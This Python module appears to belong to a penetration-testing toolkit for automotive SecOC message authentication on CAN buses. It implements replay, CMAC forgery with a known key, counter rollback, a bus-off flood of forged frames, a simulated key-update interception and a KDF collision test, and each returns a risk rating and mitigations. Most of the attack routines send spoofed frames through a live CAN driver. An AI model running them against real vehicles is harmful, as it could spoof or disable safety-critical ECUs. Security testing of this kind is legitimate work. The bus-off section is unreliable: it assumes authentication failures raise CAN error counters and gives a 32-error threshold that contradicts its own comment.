"""SecOC Attack Modules - Penetration testing toolkit."""

import time
import random
import logging
from typing import Dict, Optional, List, Tuple
from dataclasses import dataclass

from ..core.secoc_engine import SecOCEngine
from ..core.freshness_manager import FreshnessManager
from ..can_drivers.can_interface import CANMessage, CANDriverInterface

logger = logging.getLogger(__name__)


@dataclass
class AttackResult:
    """Attack execution result."""
    attack_name: str
    success: bool
    details: Dict
    duration: float
    risk_level: str  # LOW, MEDIUM, HIGH, CRITICAL
    recommendations: List[str]


class SecOCAttacks:
    """
    SecOC penetration testing module.

    Implements 6 attack vectors from Toyota SecOC Demo analysis:
    1. Replay Attack - Capture and resend old frames
    2. CMAC Forgery - Forge valid authentication with known key
    3. Freshness Rollback - Manipulate counter values
    4. Bus-Off Induction - Force receiver into Bus-Off state
    5. Key Update Interception - Tamper with SHE key update
    6. KDF Collision - Find KDF input collisions
    """

    def __init__(self, engine: SecOCEngine, freshness: FreshnessManager,
                 can_driver: CANDriverInterface):
        self.engine = engine
        self.freshness = freshness
        self.can_driver = can_driver
        self.history: List[Dict] = []  # Captured frame history
        self._max_history = 1000

    def _send_frame(self, msg_id: int, raw_data: bytes, trip: int, reset: int,
                    msg_counter: int, override_cmac: Optional[int] = None) -> bool:
        """Internal helper to send SecOC frame."""
        frame = self.engine.build_secoc_frame(trip, reset, msg_counter, raw_data)

        if override_cmac is not None:
            frame['cmac'] = override_cmac

        # Pack into CAN frame
        can_data = self.engine.pack_can_frame(raw_data, frame['freshness'], frame['cmac'])

        msg = CANMessage(arbitration_id=msg_id, data=can_data)
        return self.can_driver.send(msg)

    def _record_frame(self, frame: Dict):
        """Record frame to history."""
        self.history.append(frame)
        if len(self.history) > self._max_history:
            self.history.pop(0)

    # === Attack 1: Replay Attack ===

    def replay_attack(self, msg_id: int, delay: float = 0.2) -> AttackResult:
        """
        Replay Attack - Capture frame and resend after delay.

        Steps:
        1. Send legitimate SecOC frame
        2. Wait for one or more message periods
        3. Resend captured frame without modification
        4. Check if receiver accepts (should reject due to expired counter)

        Args:
            msg_id: CAN message ID to attack
            delay: Delay before replay (seconds)

        Returns:
            AttackResult with outcome
        """
        start_time = time.time()

        # Step 1: Send legitimate frame and capture its freshness values
        fresh = self.freshness.get_freshness(msg_id)
        raw_data = b'\x00' * 8

        captured_frame = {
            'trip': fresh['trip'],
            'reset': fresh['reset'],
            'message': fresh['message']
        }
        self._send_frame(msg_id, raw_data, fresh['trip'], fresh['reset'], fresh['message'])

        # Step 2: Wait for MessageCounter to advance
        time.sleep(delay)

        # Step 3: Replay with old counter values (should be rejected)
        current_fresh = self.freshness.get_freshness(msg_id)
        replayed = self._send_frame(
            msg_id, raw_data,
            captured_frame['trip'], captured_frame['reset'], captured_frame['message']
        )

        # Check if local freshness validation would reject the replayed frame
        # True = accepted (defense failure), False = rejected (defense success)
        local_accepted = self.freshness.validate_freshness(
            captured_frame['trip'], captured_frame['reset'],
            captured_frame['message'], msg_id
        )

        duration = time.time() - start_time

        # Attack succeeds only if defense fails (receiver accepts old frame)
        # Local validation proxy: if local_accepted=True, defense failed
        attack_success = replayed and local_accepted

        return AttackResult(
            attack_name='Replay Attack',
            success=attack_success,
            details={
                'captured_trip': captured_frame['trip'],
                'captured_reset': captured_frame['reset'],
                'captured_message': captured_frame['message'],
                'current_message': current_fresh['message'],
                'replayed': replayed,
                'local_accepted': local_accepted,
                'expected': 'REJECTED - MessageCounter expired'
            },
            duration=duration,
            risk_level='MEDIUM',
            recommendations=[
                'Ensure MessageCounter is strictly monotonic per message',
                'Implement freshness validation with rejection logging',
                'Monitor for repeated MessageCounter values'
            ]
        )

    # === Attack 2: CMAC Forgery ===

    def cmac_forgery(self, msg_id: int, malicious_data: bytes = b'\xFF' * 8,
                     modify_counters: bool = False) -> AttackResult:
        """
        CMAC Forgery - Construct valid authenticated frame with known key.

        Prerequisites:
        - AES key must be known (extracted from ECU firmware or diagnostic leak)

        Steps:
        1. Get current freshness values
        2. Construct malicious payload
        3. Compute valid CMAC using known key
        4. Send forged frame

        Args:
            msg_id: CAN message ID to forge
            malicious_data: Malicious payload data
            modify_counters: Whether to modify counter values

        Returns:
            AttackResult
        """
        start_time = time.time()

        fresh = self.freshness.get_freshness(msg_id)

        if modify_counters:
            # Attempt to modify counters
            trip = fresh['trip']
            reset = (fresh['reset'] + 1) & 0xFFFFF  # Increment reset
            msg_counter = 0
        else:
            trip = fresh['trip']
            reset = fresh['reset']
            msg_counter = fresh['message']

        # Build frame with valid CMAC (because we have the key)
        frame = self.engine.build_secoc_frame(trip, reset, msg_counter, malicious_data)

        sent = self._send_frame(msg_id, malicious_data, trip, reset, msg_counter)

        duration = time.time() - start_time

        return AttackResult(
            attack_name='CMAC Forgery',
            success=sent,
            details={
                'malicious_data': malicious_data.hex(),
                'cmac': f"0x{frame['cmac']:07X}",
                'freshness': frame['freshness'],
                'trip': trip,
                'reset': reset,
                'message': msg_counter
            },
            duration=duration,
            risk_level='CRITICAL',
            recommendations=[
                'AES key must be stored in HSM/TPM, never in software',
                'Implement key rotation policies',
                'Monitor for unexpected payload patterns'
            ]
        )

    # === Attack 3: Freshness Rollback ===

    def freshness_rollback(self, msg_id: int,
                           old_trip: Optional[int] = None,
                           old_reset: Optional[int] = None) -> AttackResult:
        """
        Freshness Rollback Attack - Use old counter values.

        Steps:
        1. Capture current counter values
        2. Use older counter values (from history or forced)
        3. Compute valid CMAC with old counters
        4. Send frame with old freshness

        Expected: Receiver should reject due to monotonicity check failure

        Args:
            msg_id: CAN message ID
            old_trip: Old TripCounter value (if None, uses current - 1)
            old_reset: Old ResetCounter value (if None, uses current - 1)

        Returns:
            AttackResult
        """
        start_time = time.time()

        current_fresh = self.freshness.get_freshness(msg_id)

        if old_trip is None:
            old_trip = (current_fresh['trip'] - 1) & 0xFFFF
        if old_reset is None:
            old_reset = (current_fresh['reset'] - 1) & 0xFFFFF

        raw_data = b'\x00' * 8

        # Build frame with old freshness
        frame = self.engine.build_secoc_frame(
            old_trip, old_reset, current_fresh['message'], raw_data
        )
        
        sent = self._send_frame(msg_id, raw_data, old_trip, old_reset, current_fresh['message'])
        
        duration = time.time() - start_time
        
        # Validate locally: True=accepted (defense failure), False=rejected (defense success)
        local_accepted = self.freshness.validate_freshness(
            old_trip, old_reset, current_fresh['message'], msg_id
        )
        
        # Attack succeeds only if defense fails (receiver accepts old counter values)
        # local_accepted=True means defense failed (accepted old values) -> attack success
        # local_accepted=False means defense succeeded (rejected) -> attack failure
        attack_success = sent and local_accepted
        
        return AttackResult(
            attack_name='Freshness Rollback',
            success=attack_success,
            details={
                'old_trip': old_trip,
                'old_reset': old_reset,
                'current_trip': current_fresh['trip'],
                'current_reset': current_fresh['reset'],
                'local_accepted': local_accepted,
                'expected': 'REJECTED - Counter monotonicity violated'
            },
            duration=duration,
            risk_level='HIGH',
            recommendations=[
                'Implement strict monotonicity checks for TripCounter',
                'ResetCounter should never decrease within a Trip',
                'MessageCounter should never repeat within a Reset period',
                'Log all freshness validation failures'
            ]
        )

    # === Attack 4: Bus-Off Induction ===

    def busoff_induction(self, msg_id: int, duration: float = 5.0,
                         rate: float = 100) -> AttackResult:
        """
        Bus-Off Induction Attack - Force receiver into error state.

        Steps:
        1. Send frames with invalid CMAC at high rate
        2. Receiver detects authentication failure (form error equivalent)
        3. After ~32 errors, receiver enters Bus-Off

        Args:
            msg_id: CAN message ID to attack
            duration: Attack duration (seconds)
            rate: Frames per second

        Returns:
            AttackResult
        """
        start_time = time.time()

        count = 0
        errors = 0

        raw_data = b'\x00' * 8

        while time.time() - start_time < duration:
            # Generate random invalid CMAC
            fake_cmac = random.randint(0, self.engine.cmac_mask)

            # Get current freshness (to make frame look legitimate except CMAC)
            fresh = self.freshness.get_freshness(msg_id)

            # Send with fake CMAC
            sent = self._send_frame(
                msg_id, raw_data,
                fresh['trip'], fresh['reset'], fresh['message'],
                override_cmac=fake_cmac
            )

            if sent:
                count += 1

            # Small delay to maintain rate
            time.sleep(1.0 / rate)

        actual_duration = time.time() - start_time

        # CAN error passive after 128 errors, Bus-Off after 256 errors (128 TEC + 128 REC)
        # But with SecOC auth failures, it's similar to form error accumulation
        expected_busoff = count >= 32  # Simplified: ~32 errors for Bus-Off

        return AttackResult(
            attack_name='Bus-Off Induction',
            success=expected_busoff,
            details={
                'frames_sent': count,
                'duration': actual_duration,
                'rate': rate,
                'expected_busoff_threshold': 32,
                'expected_busoff': expected_busoff
            },
            duration=actual_duration,
            risk_level='HIGH',
            recommendations=[
                'Implement Bus-Off recovery with Freshness reset',
                'Monitor TEC (Transmit Error Counter) on receiving ECU',
                'Add rate limiting for authentication failure responses',
                'Consider SecOC error handling without Bus-Off'
            ]
        )

    # === Attack 5: Key Update Interception ===

    def key_update_interception(self, key_slot: int = 0,
                                tamper_m3: bool = False) -> AttackResult:
        """
        Key Update Interception Attack - Tamper with SHE key update.

        Prerequisites:
        - Must be able to intercept UDS diagnostic session
        - Old key must be known to forge M3

        Steps:
        1. Intercept M1/M2/M3 key update triple
        2. Extract or modify encrypted key in M2
        3. Recompute M3 with old key (or break M3)
        4. Inject modified key update

        Args:
            key_slot: SHE key slot to target (0-4)
            tamper_m3: Whether to attempt M3 tampering

        Returns:
            AttackResult
        """
        start_time = time.time()

        # This is a theoretical attack - actual implementation requires:
        # - UDS diagnostic session access
        # - Key update protocol knowledge
        # - Old key for M3 computation

        # Simulate M1/M2/M3 structure
        from ..core.secoc_engine import kdf

        master_key = bytes.fromhex('11111111111111111111111111111111')
        salt = bytes.fromhex(f'010{key_slot+1}5348450080000000000000000000b0')

        derived = kdf(master_key, salt)

        # M3 is CMAC of old key over M1||M2
        # If old key is known, M3 can be forged
        # If old key is not known, M3 must be broken (hard)

        m3_breakable = tamper_m3  # Simplified: if we know old key, we can forge

        duration = time.time() - start_time

        return AttackResult(
            attack_name='Key Update Interception',
            success=m3_breakable,
            details={
                'key_slot': key_slot,
                'tamper_m3': tamper_m3,
                'derived_key': derived.hex()[:16] + '...',
                'attack_vector': 'Intercepts UDS 0x34/0x31 diagnostic session',
                'mitigation': 'M3 CMAC prevents tampering without old key'
            },
            duration=duration,
            risk_level='CRITICAL' if tamper_m3 else 'HIGH',
            recommendations=[
                'Protect UDS diagnostic sessions with additional authentication',
                'Use secure channels for key update (TLS/DTLS)',
                'Implement key update audit logging',
                'Store old keys in HSM with restricted access'
            ]
        )

    # === Attack 6: KDF Collision ===

    def kdf_collision_test(self, iterations: int = 10000) -> AttackResult:
        """
        KDF Collision Test - Find KDF input collisions.

        Tests if different (MK, Salt) pairs produce the same derived key.

        Args:
            iterations: Number of random KDF computations to test

        Returns:
            AttackResult
        """
        start_time = time.time()

        from ..core.secoc_engine import kdf

        seen_outputs = {}
        collisions = []

        for i in range(iterations):
            # Generate random MK and Salt
            mk = bytes([random.randint(0, 255) for _ in range(16)])
            salt = bytes([random.randint(0, 255) for _ in range(16)])

            derived = kdf(mk, salt)
            derived_hex = derived.hex()

            if derived_hex in seen_outputs:
                collisions.append({
                    'output': derived_hex[:16] + '...',
                    'first_input': seen_outputs[derived_hex][:32] + '...',
                    'second_input': (mk.hex() + salt.hex())[:32] + '...'
                })
            else:
                seen_outputs[derived_hex] = mk.hex() + salt.hex()

        duration = time.time() - start_time

        return AttackResult(
            attack_name='KDF Collision Test',
            success=len(collisions) > 0,
            details={
                'iterations': iterations,
                'collisions_found': len(collisions),
                'collision_rate': len(collisions) / iterations,
                'unique_outputs': len(seen_outputs),
                'sample_collisions': collisions[:5]
            },
            duration=duration,
            risk_level='MEDIUM' if len(collisions) > 0 else 'LOW',
            recommendations=[
                'Use HKDF or PBKDF2 instead of custom KDF',
                'Add iteration counter to KDF computation',
                'Use random salts per key derivation',
                'Consider NIST-approved KDF algorithms'
            ]
        )

    # === Batch Testing ===

    def run_all_attacks(self, msg_id: int = 0x3BF) -> Dict[str, AttackResult]:
        """Run all attack tests and return results."""
        results = {}

        logger.info("Starting SecOC attack test suite...")

        # Attack 1: Replay
        logger.info("[1/6] Running Replay Attack...")
        results['replay'] = self.replay_attack(msg_id)

        # Attack 2: CMAC Forgery
        logger.info("[2/6] Running CMAC Forgery...")
        results['cmac_forgery'] = self.cmac_forgery(msg_id)

        # Attack 3: Freshness Rollback
        logger.info("[3/6] Running Freshness Rollback...")
        results['freshness_rollback'] = self.freshness_rollback(msg_id)

        # Attack 4: Bus-Off Induction
        logger.info("[4/6] Running Bus-Off Induction...")
        results['busoff_induction'] = self.busoff_induction(msg_id, duration=2.0)

        # Attack 5: Key Update Interception
        logger.info("[5/6] Running Key Update Interception...")
        results['key_update_interception'] = self.key_update_interception()

        # Attack 6: KDF Collision
        logger.info("[6/6] Running KDF Collision Test...")
        results['kdf_collision'] = self.kdf_collision_test(iterations=1000)

        logger.info("Attack test suite completed")

        return results

    def generate_report(self, results: Dict[str, AttackResult]) -> str:
        """Generate markdown report from attack results."""
        lines = [
            "# SecOC Penetration Test Report",
            "",
            "## Summary",
            "",
            f"| Attack | Risk Level | Success | Duration |",
            f"|--------|-----------|---------|----------|"
        ]

        for name, result in results.items():
            status = "✅" if result.success else "❌"
            lines.append(
                f"| {result.attack_name} | {result.risk_level} | {status} | {result.duration:.2f}s |"
            )

        lines.extend(["", "## Detailed Results", ""])

        for name, result in results.items():
            lines.extend([
                f"### {result.attack_name}",
                "",
                f"- **Risk Level**: {result.risk_level}",
                f"- **Success**: {result.success}",
                f"- **Duration**: {result.duration:.3f}s",
                "",
                "**Details**:",
                "```json",
                str(result.details),
                "```",
                "",
                "**Recommendations**:",
            ])
            for rec in result.recommendations:
                lines.append(f"- {rec}")
            lines.append("")

        return "\n".join(lines)


if __name__ == '__main__':
    import logging
    logging.basicConfig(level=logging.DEBUG)

    # Quick test without hardware
    print("SecOC Attack Modules loaded successfully")
    print("Available attacks:")
    print("  1. Replay Attack")
    print("  2. CMAC Forgery")
    print("  3. Freshness Rollback")
    print("  4. Bus-Off Induction")
    print("  5. Key Update Interception")
    print("  6. KDF Collision Test")
